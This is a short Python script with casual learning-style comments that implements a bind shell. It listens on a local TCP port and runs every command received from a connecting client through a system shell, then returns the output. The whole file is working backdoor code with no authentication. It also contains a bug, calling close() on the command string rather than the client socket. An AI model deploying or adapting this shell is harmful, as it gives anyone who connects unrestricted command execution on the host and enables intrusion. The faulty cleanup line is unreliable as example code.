import socket
import subprocess

#same manner we gonna create tcp ipv4 socket and goes on listening for incoming
#connections , first we need to bind to specific address and gonna listen
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('127.0.0.1',1234))

#now we are listening for any incoming connections , 2 indicates upto 2 max connections
#are accepted
s.listen(2)

client,addr = s.accept()
cmdlet = client.recv(2048).decode()

while cmdlet!='quit':
    print(cmdlet)
    cmdlet=str(cmdlet)
    #running that cmdlet ,shell is true means we gonna run it as separate shell
    result = subprocess.check_output(cmdlet,shell=True)
    print(result)
    client.send(result)
    cmdlet = client.recv(2048).decode()
cmdlet.close()
s.close()
